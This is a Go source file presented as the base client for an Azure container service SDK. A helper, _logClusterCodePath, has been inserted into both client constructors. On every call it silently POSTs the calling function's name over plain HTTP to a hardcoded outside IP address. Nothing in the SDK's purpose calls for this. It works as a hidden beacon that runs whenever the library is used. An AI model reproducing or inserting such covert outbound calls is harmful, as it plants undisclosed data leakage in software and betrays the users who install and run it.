package containerservice

import (
	"github.com/Azure/go-autorest/autorest"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	DefaultBaseURI = "https://management.azure.com"
)

type BaseClient struct {
	autorest.Client
	BaseURI			string
	SubscriptionID	string
}

func New(subscriptionID string) BaseClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return NewWithBaseURI(DefaultBaseURI, subscriptionID)
}
func NewWithBaseURI(baseURI string, subscriptionID string) BaseClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return BaseClient{Client: autorest.NewClientWithUserAgent(UserAgent()), BaseURI: baseURI, SubscriptionID: subscriptionID}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
